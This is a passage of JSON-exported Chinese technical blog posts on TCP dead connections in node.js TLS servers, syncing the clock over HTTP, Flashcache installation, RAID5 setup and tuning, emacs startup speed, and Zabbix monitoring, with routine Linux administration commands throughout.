  "body": "<p>\n最近一段时间，由于开发工作开始跟嵌入式相关，开始遇到一个问题：TCP死连接。\n</p>\n\n<p>\nTCP死连接症状是这样的：通信双方从一方系统上看已经断开（不存在），但是另一方系统上看却是连接中（ESTABLISHED状态）。\n</p>\n\n<p>\nTCP死连接一般在一方（或中间线路上的设备）断电、死机后出现，此时由于另一方收不到断开连接的IP报文，会认为连接仍然存在，日积月累会耗光文件描述符空间从而导致性能下降，最终拒绝服务。\n</p>\n\n<p>\n对付这种问题，一般需要双方都进行连接心跳检测。比如：连接空闲一段时间后一方发一个心跳请求，另一端回个心跳响应，心跳请求发送方一段时间后还收不到响应则认为连接已断开，心跳请求接收方一段时间内没有收到心跳请求也认为连接已断开。\n</p>\n\n<p>\n需要注意到的是node.js的tls服务器端握手超时处理不当可能会导致TCP死连接出现，有问题的代码示例如下：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">options</span> = {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   key: <span style=\"color: #66cccc;\">\"...\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cert: <span style=\"color: #66cccc;\">\"...\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   handshakeTimeout: 10*1000,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   plain: <span style=\"color: #6699cc;\">true</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ssl: <span style=\"color: #6699cc;\">true</span>\n};\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">tlsServer</span> = tls.createServer(options, app).listen(5433, 8192, <span style=\"color: #99cc99;\">function</span>(){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   logger.log(<span style=\"color: #66cccc;\">'tls server listening on port 5433'</span>);\n});\n\ntlsServer.on(<span style=\"color: #66cccc;\">'clientError'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">exception</span>, <span style=\"color: #ffcc66;\">socket</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   logger.warn(<span style=\"color: #66cccc;\">'tls server client('</span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'</span> + socket.remot<span style=\"text-decoration: underline;\">ePort +</span><span style=\"color: #66cccc; text-decoration: underline;\">') error('</span><span style=\"text-decoration: underline;\"> + exception + </span><span style=\"color: #66cccc; text-decoration: underline;\">')'</span><span style=\"text-decoration: underline;\">);</span>\n});\n</pre>\n</div>\n\n<p>\n上面的代码通过指定 <code>handshakeTimeout</code> 使用指定SSL握手超时时间，但是并未关闭底层的TCP连接，从而导致TCP连接泄露，在 <code>clientError</code> 事件处理函数中添加以下释放语句即可：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">socket.destroy();\n</pre>\n</div>\n\n<p>\n除了常见的断电、死机引起TCP死连接外，这里还有一个论坛帖子论坛其它原因：《<a href=\"http://serverfault.com/questions/504187/too-many-established-connections-left-open\">Too many established connections left open</a>》。\n</p>\n\n<p>\n另外还有 linux 内核的 tcp keepalive机制作为心跳解决方案：《<a href=\"http://machael.blog.51cto.com/829462/211989/\">linux下使用TCP存活(keepalive)定时器</a>》。\n</p>\n\n<p>\n谨记：除了主动通过连接发送数据外，其它情况下操作系统可能不会告诉你连接已经关闭了。\n</p>\n\n<p>\n要彻底解决这个问题，除了要避免泄露（或忘记关闭）TCP连接外，要有心跳机制，还需要从代码层面进行防御性编程，如：对于读写操作设置超时时间，一旦超时主动关闭连接。</p>\n"
},
{
  "title": "linux下通过HTTP同步系统时间",
  "timestamp": "2015-04-21 11:54:00",
  "tags": [
    "linux"
  ],
  "body": "<p>\n在 <code>NTP</code> 被禁用的网络环境下，可以通过 <code>HTTP</code> 协议从公开的网站（如：www.baidu.com）同步时间，因为HTTP响应通常会带一个Date字段，这是WEB服务器的系统时间，可以用它来设置本机时间。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo date --rfc-2822 -s <span style=\"color: #66cccc;\">\"`curl -s -i -X HEAD --header \"Connection: close\" http:/</span><span style=\"color: #66cccc; text-decoration: underline;\">/www.baidu.com | grep -E '^Date: ' | awk -F ': ' '{print $2}'`\"</span>\n</pre>\n</div>\n"
},
{
  "title": "在Archlinux上使用FlashCache",
  "timestamp": "2015-04-23 20:16:00",
  "tags": [
    "archlinux",
    "flashcache"
  ],
  "body": "<p>\n<a href=\"https://github.com/facebook/flashcache/\">Flashcache</a> 是 <a href=\"https://www.facebook.com\">Facebook</a> 的一个开源项目，通过将固态硬盘（SSD）做为机械硬盘（HDD）的缓存层，提升磁盘I/O性能。\n</p>\n\n<p>\n<a href=\"https://github.com/facebook/flashcache/\">Flashcache</a> 位于磁盘驱动层与文件系统层之间，是一个 <code>linux</code> 内核模块。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">编译安装</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n由于Archlinux总是使用最新的linux内核，最好从最新的 <a href=\"https://github.com/facebook/flashcache/\">Flashcache</a> 源代码进行编译安装。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone https://github.com/facebook/flashcache.git\n<span style=\"color: #cc99cc;\">cd</span> flashcache\nmake\nsudo make install\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">挂载模块</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo insmod /lib/modules/<span style=\"color: #cc99cc;\">`uname -r`</span>/extra/flashcache/flashcache.ko\n</pre>\n</div>\n\n<ul class=\"org-ul\">\n<li>修复挂载错误\n\n<blockquote>\n<p>\ninsmod: ERROR: could not insert module /lib/modules/3.19.3-3-ARCH/extra/flashcache/flashcache.ko: Unknown symbol in module\n</p>\n</blockquote>\n\n<p>\n通过 <code>dmesg | grep flashcache</code> 可以看到以下错误信息：\n</p>\n\n<blockquote>\n<p>\n[ 2130.514615] flashcache: Unknown symbol dm_put_device (err 0)<br  />\n       [ 2130.514654] flashcache: Unknown symbol dm_io_client_create (err 0)<br  />\n       [ 2130.514693] flashcache: Unknown symbol dm_kcopyd_client_create (err 0)<br  />\n       [ 2130.514738] flashcache: Unknown symbol dm_unregister_target (err 0)<br  />\n       [ 2130.514774] flashcache: Unknown symbol dm_io_client_destroy (err 0)<br  />\n       [ 2130.514798] flashcache: Unknown symbol dm_kcopyd_copy (err 0)<br  />\n       [ 2130.514821] flashcache: Unknown symbol dm_register_target (err 0)<br  />\n       [ 2130.514846] flashcache: Unknown symbol dm_kcopyd_client_destroy (err 0)<br  />\n       [ 2130.514870] flashcache: Unknown symbol dm_table_get_mode (err 0)<br  />\n       [ 2130.514895] flashcache: Unknown symbol dm_io (err 0)<br  />\n       [ 2130.514915] flashcache: Unknown symbol dm_get_device (err 0)\n</p>\n</blockquote>\n\n<p>\n先挂载 <code>dm-mod</code> 模块再挂载 <code>flashcache</code> 模块即可：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo modprobe dm-mod\nsudo insmod /lib/modules/<span style=\"color: #cc99cc;\">`uname -r`</span>/extra/flashcache/flashcache.ko\n</pre>\n</div>\n\n<p>\n参考：<a href=\"https://bbs.archlinux.org/viewtopic.php?id=30478\">No entry for device-mapper found</a>\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">模拟实验</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n参考：<a href=\"http://my.oschina.net/renguijiayi/blog/303747\">flashcache的实现与用法</a>\n</p>\n\n<ul class=\"org-ul\">\n<li>创建SSD模拟设备\n\n<p>\n使用内存文件模拟块设备（1G）\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">dd <span style=\"color: #ffcc66;\">if</span>=/dev/zero <span style=\"color: #ffcc66;\">of</span>=/dev/shm/ssd.img <span style=\"color: #ffcc66;\">bs</span>=1024k <span style=\"color: #ffcc66;\">count</span>=1024\nsudo losetup /dev/loop1 /dev/shm/ssd.img\n</pre>\n</div>\n</li>\n\n<li>创建HDD模拟设备\n\n<p>\n使用普通磁盘文件模拟块设备（5G）\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo dd <span style=\"color: #ffcc66;\">if</span>=/dev/zero <span style=\"color: #ffcc66;\">of</span>=/hdd.img <span style=\"color: #ffcc66;\">bs</span>=1024k <span style=\"color: #ffcc66;\">count</span>=5120\nsudo losetup /dev/loop2 /hdd.img\n</pre>\n</div>\n</li>\n\n<li>创建Flashcache混合设备\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo flashcache_create -p around cachedev /dev/loop1 /dev/loop2\nsudo mkfs.ext4 /dev/mapper/cachedev\n</pre>\n</div>\n</li>\n\n<li>挂载Flashcache混合设备\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo mkdir /data\nsudo mount /dev/mapper/cachedev /data\n</pre>\n</div>\n</li>\n</ul>\n\n<p>\n/data目录下的数据读写就已经在使用Flashcache了。\n</p>\n\n<ul class=\"org-ul\">\n<li>创建用来测试的数据文件（1G）\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">dd <span style=\"color: #ffcc66;\">if</span>=/dev/urandom <span style=\"color: #ffcc66;\">of</span>=/dev/shm/test.dat <span style=\"color: #ffcc66;\">bs</span>=1024k <span style=\"color: #ffcc66;\">count</span>=1024\n</pre>\n</div>\n</li>\n\n<li>测算使用HDD写耗时\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /dev/shm/test.dat /'</span>\n</pre>\n</div>\n\n<p>\n输出：\n</p>\n\n<pre class=\"example\">\nreal    0m4.751s\nuser    0m0.000s\nsys 0m0.600s\n</pre>\n</li>\n\n<li>测算使用HDD读耗时\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /test.dat /dev/shm/</span>\n</pre>\n</div>\n\n<p>\n输出：\n</p>\n\n<pre class=\"example\">\nreal    0m10.580s\nuser    0m0.010s\nsys 0m0.727s\n</pre>\n</li>\n\n<li>测算使用Flashcache写耗时\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /dev/shm/test.dat /data/'</span>\n</pre>\n</div>\n\n<p>\n输出：\n</p>\n\n<pre class=\"example\">\nreal    0m7.363s\nuser    0m0.000s\nsys 0m0.760s\n</pre>\n</li>\n\n<li>测算使用Flashcache读耗时\n\n<p>\n第一轮测试（缓存预热）\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /data/test.dat /dev/shm/'</span>\n</pre>\n</div>\n\n<p>\n输出：\n</p>\n\n<pre class=\"example\">\nreal    0m9.557s\nuser    0m0.013s\nsys 0m1.157s\n</pre>\n\n<p>\n第二轮测试（缓存生效）\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo sh -c <span style=\"color: #66cccc;\">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /data/test.dat /dev/shm/'</span>\n</pre>\n</div>\n\n<p>\n输出：\n</p>\n\n<pre class=\"example\">\nreal    0m3.107s\nuser    0m0.000s\nsys 0m0.850s\n</pre>\n</li>\n\n<li>清除测试数据\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo rm /test.dat /dev/shm/test.dat /data/test.dat\n</pre>\n</div>\n</li>\n\n<li>结果分析\n\n<ul class=\"org-ul\">\n<li>Flashcache读性能： <b>提升70%</b>\n</li>\n\n<li>Flashcache写性能： <b>降低55%</b>\n</li>\n</ul>\n<p>\n因为使用了 <code>Write-Around</code> 方式，所以提升了读性能，降低了写性能。\n</p>\n</li>\n\n<li>清除模拟环境\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo umount /data\nsudo dmsetup remove cachedev\nsudo losetup -d /dev/loop1\nsudo rm /dev/shm/ssd.img\nsudo losetup -d /dev/loop2\nsudo rm /hdd.img\nsudo rmdir /data\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "FlashCache多盘方案实战",
  "timestamp": "2015-04-29 17:38:00",
  "tags": [
    "linux",
    "flashcache",
    "RAID"
  ],
  "body": "<p>\n目标系统为单SSD+多HDD，将多HDD创建为RAID5逻辑盘，然后使用FlashCache将SSD做为RAID5逻辑盘的缓存。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">系统信息</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>OS\n\n<p>\nCentOS release 6.5 (Final) x86_64\n</p>\n</li>\n\n<li>CPU\n\n<p>\n8\n</p>\n\n<p>\nIntel(R) Atom(TM) CPU  C2750  @ 2.40GHz\n</p>\n</li>\n\n<li>MEMORY\n\n<p>\n4\n</p>\n\n<p>\nTOTAL 16G\n</p>\n</li>\n\n<li>HDD\n\n<p>\n4\n</p>\n\n<p>\nWDC WD4000FYYZ-0 4TB 7200转\n</p>\n\n<p>\n/dev/sdc /dev/sdd /dev/sde /dev/sdf\n</p>\n</li>\n\n<li>SSD\n\n<p>\n1\n</p>\n\n<p>\nINTEL SSDSC2BB30 300GB\n</p>\n\n<p>\n/dev/sdb\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">卸载HDD及SSD盘</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">umount /dev/sdc /dev/sdd /dev/sde /dev/sdf /dev/sdb\n</pre>\n</div>\n\n<p>\n确保系统重启后不会自动挂载这些盘。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">将多HDD创建为RAID5逻辑盘</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>格式化HDD盘\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">parted /dev/sdc\n(parted) mklabel gpt\n(parted) unit TB\n(parted) mkpart primary 0.00TB 4.00TB\n(parted) print\n</pre>\n</div>\n\n<p>\n其它HDD盘也做如上处理.\n</p>\n</li>\n\n<li>创建RAID5逻辑分区\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mdadm --create /dev/md0 --level=raid5 --raid-devices=4 /dev/sd[c-f]1\nparted /dev/md0\n(parted) mklabel gpt\n(parted) unit TB\n(parted) mkpart primary 0.00TB 12.00TB\n(parted) print\n(parted) quit\n</pre>\n</div>\n</li>\n\n<li>保存RAID5配置\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mdadm --detail --scan &gt; /etc/mdadm.conf\n</pre>\n</div>\n\n<p>\n参考：<a href=\"https://raid.wiki.kernel.org/index.php/RAID_setup#Saving_your_RAID_configuration\">Saving your RAID configuration</a>\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">安装Flashcache</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget https://github.com/facebook/flashcache/archive/stable_v3.1.3.zip -O flashca<span style=\"text-decoration: underline;\">che_stable_v3.1.3.zip</span>\nunzip flashcache_stable_v3.1.3.zip\n<span style=\"color: #cc99cc;\">cd</span> flashcache-stable_v3.1.3\nmake\nmake install\nmodprobe flashcache\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">创建Flashcache混合设备</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">flashcache_create -p around cachedev /dev/sdb /dev/md0p1\nmkfs.ext4 /dev/mapper/cachedev\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">挂载Flashcache混合设备</h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir /data\nmount /dev/mapper/cachedev /data\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-7\" class=\"outline-2\">\n<h2 id=\"sec-7\">系统重启后需要重新创建并挂载Flashcache设备</h2>\n<div class=\"outline-text-2\" id=\"text-7\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">flashcache_create -p around cachedev /dev/sdb /dev/md0p1\nmount /dev/mapper/cachedev /data\n</pre>\n</div>\n\n<p>\n注意：使用除 <code>writethrough</code> 和 <code>writearound</code> 以外的模式需要使用 <code>flashcache_load</code> 重新创建设备。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-8\" class=\"outline-2\">\n<h2 id=\"sec-8\">写入速度测试</h2>\n<div class=\"outline-text-2\" id=\"text-8\">\n<p>\n循环创建60MiB大小的文件，测得的磁盘写入速度为 <b>35.6MiB</b> ，磁盘读取速度为 <b>2.1MiB</b> 。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-9\" class=\"outline-2\">\n<h2 id=\"sec-9\">读取速度测试</h2>\n<div class=\"outline-text-2\" id=\"text-9\">\n<ul class=\"org-ul\">\n<li>500并发120G文件每次读取32KB顺序读取\n\n<ul class=\"org-ul\">\n<li>请求处理速度\n\n<p>\n2107\n</p>\n</li>\n\n<li>传输速度\n\n<p>\n132.35MiB/s\n</p>\n</li>\n</ul>\n</li>\n\n<li>500并发500G文件每次读取32KB顺序读取\n\n<ul class=\"org-ul\">\n<li>请求处理速度\n\n<p>\n1937\n</p>\n</li>\n\n<li>传输速度\n\n<p>\n61.09MiB\n</p>\n</li>\n</ul>\n</li>\n\n<li>500并发1T文件每次读取32KB顺序读取\n\n<ul class=\"org-ul\">\n<li>请求处理速度\n\n<p>\n1574\n</p>\n</li>\n\n<li>传输速度\n\n<p>\n49.64MiB/s\n</p>\n</li>\n</ul>\n</li>\n\n<li>500并发120G文件每次读取64KB顺序读取\n\n<ul class=\"org-ul\">\n<li>请求处理速度\n\n<p>\n5006\n</p>\n</li>\n\n<li>传输速度\n\n<p>\n157.88MiB/s\n</p>\n</li>\n</ul>\n</li>\n\n<li>500并发500G文件每次读取64KB顺序读取\n\n<ul class=\"org-ul\">\n<li>请求处理速度\n\n<p>\n897\n</p>\n</li>\n\n<li>传输速度\n\n<p>\n56.37MiB/s\n</p>\n</li>\n</ul>\n</li>\n\n<li>500并发1T文件每次读取64KB顺序读取\n\n<ul class=\"org-ul\">\n<li>请求处理速度\n\n<p>\n782\n</p>\n</li>\n\n<li>传输速度\n\n<p>\n49.10MiB/s\n</p>\n</li>\n</ul>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-10\" class=\"outline-2\">\n<h2 id=\"sec-10\">注意事项</h2>\n<div class=\"outline-text-2\" id=\"text-10\">\n<ul class=\"org-ul\">\n<li>重建（rebuild）\n\n<p>\n当一块盘坏掉后，如果配置了热备盘（Hot spare disk），会自动重建，请将坏盘换掉并配置成热备盘；\\\n如果未配置热备盘，读性能会下降（坏盘中的数据需要全部通过计算重现），请将坏盘换掉系统会自动进行重建。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-11\" class=\"outline-2\">\n<h2 id=\"sec-11\">潜在的优化选项</h2>\n<div class=\"outline-text-2\" id=\"text-11\">\n<ul class=\"org-ul\">\n<li>开启SSD写Cache\n</li>\n\n<li>禁用文件、目录访问时间戳\n\n<p>\nnoatime,nodiratime\n</p>\n</li>\n\n<li><code>Write-Back</code> 模式优化\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.sdb+md0p1.dirty_thresh_pct=80\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n\n\n<div id=\"outline-container-sec-12\" class=\"outline-2\">\n<h2 id=\"sec-12\">卸载Flashcache设备</h2>\n<div class=\"outline-text-2\" id=\"text-12\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">umount /dev/mapper/cachedev\ndmsetup remove cachedev\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-13\" class=\"outline-2\">\n<h2 id=\"sec-13\">Q&amp;A</h2>\n<div class=\"outline-text-2\" id=\"text-13\">\n<ul class=\"org-ul\">\n<li>重新调整 Flashcache 选项会不会删除数据？\n\n<p>\n<code>writethrough</code> 、 <code>writearound</code> 模式不会，其它的会。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-14\" class=\"outline-2\">\n<h2 id=\"sec-14\">相关参考</h2>\n<div class=\"outline-text-2\" id=\"text-14\">\n<dl class=\"org-dl\">\n<dt> 《<a href=\"http://lzw.me/a/linux-lvm.html\">Linux LVM逻辑卷管理详细介绍</a>》 </dt><dd>非常好的LVM入门文章\n</dd>\n\n<dt> 《<a href=\"http://www.linux-mag.com/id/7582/\">Pick Your Pleasure: RAID-0 mdadm Striping or LVM Striping?</a>》 </dt><dd>LVM与RAID-0的比较\n</dd>\n\n<dt> 《<a href=\"http://www.tecmint.com/create-raid0-in-linux/\">Creating Software RAID0 (Stripe) on ‘Two Devices’ Using ‘mdadm’ Tool in Linux – Part 2</a>》 </dt><dd>构建RAID-0教程\n</dd>\n\n<dt> 《<a href=\"http://zengrong.net/post/2014.htm\">在CentOS 6.1上配置 4TB硬盘+RAID1</a>》 </dt><dd>使用 <code>parted</code> 代替 <code>fdisk</code> 对大于2TB的硬盘进行分区\n</dd>\n\n<dt> 《<a href=\"http://wiki.mikejung.biz/Software_RAID\">Software RAID - How to Optimize Software RAID on Linux using Mdadm</a>》 </dt><dd>优化RAID\n</dd>\n\n<dt> 《<a href=\"http://sysadmin.blog.51cto.com/83876/236802\">RAID5单盘故障读写分析</a>》 </dt><dd>RAID5一块盘坏掉后的情形分析\n</dd>\n</dl>\n</div>\n</div>\n"
},
{
  "title": "Flashcache优化",
  "timestamp": "2015-05-22 18:12:00",
  "tags": [
    "flashcache"
  ],
  "body": "<ul class=\"org-ul\">\n<li>调整 dev.flashcache.&lt;cache name&gt;.dirty_thresh_pct\n\n<p>\n脏缓存回写阈值（百分比），默认 <code>20</code> 。\n</p>\n\n<p>\n仅 <code>Write-Back</code> 模式下有效。\n</p>\n\n<p>\n调大该值可以减轻写压力（缓存数据写入HDD及元数据写入SSD），缓存已满时该缓存块不能被淘汰，减少了可用缓存空间。\n</p>\n\n<p>\n如果最近写入的数据很可能是热数据，可以考虑调大该值，建议调到 <code>90</code> ：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.&lt;cache name&gt;.dirty_thresh_pct=90\n</pre>\n</div>\n</li>\n\n<li>调整 dev.flashcache.reclaim_policy\n\n<p>\n缓存空间回收策略，默认 <code>FIFO(0)</code> 。\n</p>\n\n<p>\n改为 <code>LRU(1)</code> :\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.&lt;cache name&gt;.reclaim_policy=1\n</pre>\n</div>\n</li>\n\n<li>辅助调试\n\n<ul class=\"org-ul\">\n<li>统计清零\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.&lt;cache name&gt;.zero_stats=1\n</pre>\n</div>\n</li>\n\n<li>快速停止\n\n<p>\nFlashcache在停止时会将SSD中的脏数据写回到HDD中，这是非常耗时的，会导致关机慢。\n</p>\n\n<p>\n手工快速停止\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">service flashcache forcestop\n</pre>\n</div>\n\n<p>\n总是快速停止\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sysctl -w dev.flashcache.sdb+sdc1.fast_remove=1\n</pre>\n</div>\n</li>\n</ul>\n</li>\n</ul>\n"
},
{
  "title": "emacs启动速度优化",
  "timestamp": "2015-05-24 11:17:00",
  "tags": [
    "emacs"
  ],
  "body": "<p>\nemacs装了很多插件后，启动越来越慢了，最近发现启动一次要25秒，赶得上操作系统启动时间了，是时候优化一下启动速度了。\n</p>\n\n<ul class=\"org-ul\">\n<li>裸启动emacs\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">emacs --quick\n</pre>\n</div>\n\n<p>\n尽然耗时10秒，网上查了一下这个问题常见于 <code>archlinux</code> ，是网络配置引起: <a href=\"https://wiki.archlinux.org/index.php/Emacs#Incorrect_network_configuration\">Emacs - Slow startup - Incorrect network configuration</a>\n</p>\n\n<p>\n解决方案就是将主机名（ <code>hostname</code> 命令输出）加到 <code>/etc/hosts</code> 中：\n</p>\n\n<pre class=\"example\">\n127.0.0.1   localhost.localdomain   localhost &lt;hostame&gt;\n::1     localhost.localdomain   localhost  &lt;hostname&gt;\n</pre>\n\n<p>\n再试，emacs瞬间启动。\n</p>\n</li>\n\n<li>不加载个人配置文件启动emacs\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">emacs --no-init-file\n</pre>\n</div>\n\n<p>\nemacs瞬间启动。\n</p>\n</li>\n\n<li>不加载最近保存的桌面启动emacs\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">emacs --no-desktop\n</pre>\n</div>\n\n<p>\n耗时15秒，看来是个人配置的问题了\n</p>\n</li>\n\n<li>从前面开始一块一块反注释emacs配置，看是卡在哪里\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-lisp\">(<span style=\"color: #99cc99;\">require</span> '<span style=\"color: #6699cc;\">anything-config</span>)\n</pre>\n</div>\n\n<p>\n这一句耗时11秒，注释掉，现在启时时间为5秒，可以接受了。</p>\n</li>\n</ul>\n"
},
{
  "title": "Zabbix添加Flashcache监控",
  "timestamp": "2015-05-29 16:27:00",
  "tags": [
    "flashcache",
    "zabbix"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">下载 <code>Zabbix</code> 的 <code>Flashcache</code> 开源模板</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone https://github.com/lesovsky/zabbix-extensions.git\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">设置 <code>zabbix_agentd</code></h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#23433;&#35013;&#37197;&#32622;&#25991;&#20214;</span>\ncp zabbix-extensions/files/flashcache/flashcache.conf /usr/local/etc/zabbix_agen<span style=\"text-decoration: underline;\">td.conf.d/</span>\n<span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#23433;&#35013;&#33050;&#26412;</span>\nmkdir /usr/local/etc/zabbix_scripts\ncp zabbix-extensions/files/flashcache/scripts/* /usr/local/etc/zabbix_scripts/\n<span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#20462;&#25913;&#37197;&#32622;&#25991;&#20214;&#20013;&#24341;&#29992;&#30340;&#33050;&#26412;&#36335;&#24452;</span>\nsed --in-place -e <span style=\"color: #66cccc;\">'s/\\/usr\\/libexec\\/zabbix-extensions\\//\\/usr\\/local\\/etc\\/zabb</span><span style=\"color: #66cccc; text-decoration: underline;\">ix_/g'</span><span style=\"text-decoration: underline;\"> /usr/local/etc/zabbix_agentd.conf.d/flashcache.conf</span>\n<span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">&#21253;&#21547;&#37197;&#32622;&#25991;&#20214;&#30446;&#24405;</span>\nsed --in-place -e <span style=\"color: #66cccc;\">'s/# Include=\\/usr\\/local\\/etc\\/zabbix_agentd\\.conf\\.d\\//Inclu</span><span style=\"color: #66cccc; text-decoration: underline;\">de=\\/usr\\/local\\/etc\\/zabbix_agentd\\.conf\\.d\\//g'</span><span style=\"text-decoration: underline;\"> /usr/local/etc/zabbix_agentd.conf</span>\n</pre>\n</div>\n\n<p>\n重启 <code>zabbix_agentd</code> 生效配置。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">设置 <code>Zabbix</code> 后台</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>导入 <code>Flashcache</code> 模板\n\n<p>\nConfiguration -&gt; Templates -&gt; Import -&gt; Import file 选择之前下载的 <code>zabbix-extensions/files/flashcache/flashcache-template.xml</code>\n</p>\n</li>\n\n<li>应用 <code>Flashcache</code> 模板\n\n<p>\nConfiguration -&gt; Hosts 下选择要应用到的主机 -&gt; Templates -&gt; Link new templates 选择 <code>Flashcache-Template</code></p>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
